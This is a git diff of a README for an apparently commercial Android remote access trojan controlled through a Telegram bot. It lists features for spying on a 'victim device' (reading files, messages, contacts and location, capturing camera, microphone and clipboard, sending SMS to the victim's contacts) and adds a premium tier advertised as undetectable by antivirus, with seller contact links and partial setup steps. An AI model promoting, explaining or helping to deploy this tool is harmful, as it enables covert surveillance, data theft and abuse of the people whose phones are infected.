@@ -1,4 +1,3 @@
-
 ![Logo](https://999xprofit.com/dogs/logo.png)
 
 [![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/shivayadavv)
@@ -11,7 +10,6 @@ A multifunctional Telegram based Android RAT  without port forwarding.
 - VIDEO TUTORIALS AND NEW UPDATES AVIALBLE HERE
 https://shivaya-dav.github.io/dogeweb/
 ## Features
-
  - Read all the files of Internal Storage
  - Delete files or folder from victim device
  - Download Any Media to your Device from Victims Device
@@ -27,7 +25,6 @@ https://shivaya-dav.github.io/dogeweb/
 - Pre Binded with [Instagram Webview]
  - Runs In Background 
     - Auto Starts on restarting the device
-    
  - No port forwarding needed
 
 ## Requirements
@@ -35,6 +32,34 @@ https://shivaya-dav.github.io/dogeweb/
  - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
 [ApkTool Editor](https://999xprofit.com/dogs/apkeditor.apk) ( for Android)
 
+## RECENTLY WE LAUNCHED DOGERAT PREMIUM {PLEASE CHECK}
+
+## Premium featuers
+- 🔴 Real time
+- 🌐 custom web view
+- 🔔 notification reader
+- 🔔 notification sender (send custom notification that apper on target device with custom click link)
+- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
+- 📡 receive information about simcard provider
+- 📳 vibrate target device
+- 🛰️ receive device location
+- ✉️ receive all target message
+- ✉️ send sms with target device to any number
+- ✉️ send sms with target device to all of his/her contacts
+- 👤 recive all target contacts
+- 💻 receive list of all installedd apps in target device
+- 📁 receive any file or folder from target device
+- 📁 delete any file or folder from target device
+- 📷 capture main and front camera
+- 🎙 capture microphone (with custom duration)
+- 📋 receive last clipboard text
+- ✅️ auto start after device boot
+- ✨ Beautiful telegram bot interface
+-🤖 Undetectable by antivirus
+
+[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/shivayadavv)
+
+I will setup everything after purchase you don't need to do anything ❤️😁
 
 ## How to use
 - Search  BotFather on Telegram
@@ -65,7 +90,7 @@ https://shivaya-dav.github.io/dogeweb/
 ![App Screenshot](https://999xprofit.com/dogs/10.jpg)
 ![App Screenshot](https://999xprofit.com/dogs/11.jpg)
 - paste your glitch url 
-```bash
+```bash  
   { 
   "host": "https://https://xxxx.glitch.me/", 
   "socket": "wss://xxxx.glitch.me/", 
